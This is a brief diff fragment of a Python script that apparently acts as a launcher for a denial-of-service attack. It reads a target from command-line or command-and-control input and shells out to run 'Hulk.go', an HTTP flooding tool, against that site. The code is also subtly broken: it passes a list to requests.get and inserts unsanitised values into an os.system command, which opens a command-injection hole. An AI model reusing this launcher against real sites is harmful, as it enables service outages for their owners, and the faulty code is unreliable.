@@ -772,6 +772,6 @@ def login():
 main()
 #url = cnc.split()[1]
 #method = cnc.split()[2]
-url = requests.get('https://api.github.com/events')
+url = requests.get(sys.argv[1:])
 method = 'GET'
 os.system(f'go run Hulk.go -site {url} -data {method}')
